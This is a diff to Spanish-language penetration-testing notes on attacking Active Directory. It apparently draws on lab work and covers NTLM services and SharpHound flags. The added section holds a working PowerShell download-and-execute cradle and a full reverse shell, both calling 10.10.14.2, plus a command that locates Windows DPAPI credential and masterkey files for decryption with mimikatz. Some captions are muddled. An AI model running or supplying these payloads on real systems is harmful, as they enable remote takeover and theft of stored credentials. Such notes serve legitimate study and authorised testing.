@@ -83,7 +83,7 @@ El primer paso, sera descubrir si existe un dominio presente, este escaneo es pa
 ```s
 C:\>net view /domain
 ```
-
+## [](#header-2)<a id="reconocimiento">Initial Access</a>
 ## [](#header-2)<a id="Breaching_ad">Breaching Active Directory</a>
 NTLM Authenticated Services
 New Technology LAN Manager (NTLM). Es el modo de autenticacion usado por varias tecnologias integradas en el AD, como Mail (Outlook Web App), accesos a RDP expuestos a internet, VPN que son integradas con AD, aplicaciones web que hacen uso de NetNTLM.
@@ -314,3 +314,22 @@ Parameters explained:
     ExcludeDCs -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.
 
 Los parámetros de Sharphound se encuentran en https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
+
+Descarga de archivos con powershell
+
+```powershell
+START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2:9001/shell.ps1')
+```
+
+.bat Para ejecutar el comando anterior
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+Post priv escalation
+
+Las credential filenames tienen una cadena de 32 caracteres como por ejemplo: "85E671988F9A2D1981A4B6791F9A4EE8" y las masterkeys son un GUID como "cc6eb538-28f1-4ab4-adf2-f5594e88f0b2", para encontrarlas tenemos el comando:
+```shell
+cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\security\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\security\AppData\Local\Microsoft\Protect  & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Protect"
+```
+Las credenciales y masterkey estan en base64, podemos regresarlas a su orden normal con mimikats https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
